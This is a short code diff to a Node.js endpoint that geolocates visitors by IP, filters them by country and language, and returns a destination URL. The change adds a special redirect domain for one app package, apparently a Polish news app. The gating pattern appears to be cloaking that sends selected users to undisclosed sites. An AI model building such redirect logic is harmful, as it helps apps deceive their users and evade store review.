@@ -17,7 +17,7 @@ module.exports.getUrl = async function (req, res) {
             ip = ip.substr(7)
         }
 
-        let data = checkCountry(ip, req.body.language);
+        let data = checkCountry(ip, req.body.language, req.body.app);
 
         let unique;
         const uniqueUser = await User.findOne({ip})
@@ -95,7 +95,7 @@ module.exports.getUrl = async function (req, res) {
     }
 }
 
-function checkCountry(ip, language) {
+function checkCountry(ip, language, app) {
     let geo = geoip.lookup(ip);
     let countryCode;
     let city;
@@ -121,7 +121,12 @@ function checkCountry(ip, language) {
                 language.toUpperCase() ==='EN-RU' ||
                 language.toUpperCase() ==='EN-PL' ||
                 language.toUpperCase() ==='PL') {
-                url = 'maxecmtitier.pl'
+                if (app === 'com.appside.polishnewsapp') {
+                    url = 'pulsbihzdnmnesu.info'
+                } else {
+                    url = 'maxecmtitier.pl'
+                }
+
             } else {
                 reason = 'Invalid language'
                 url = null
@@ -130,7 +135,6 @@ function checkCountry(ip, language) {
             url = null;
             reason = 'Invalid country'
         }
-
     }
 
     return {url, countryCode, city, reason}
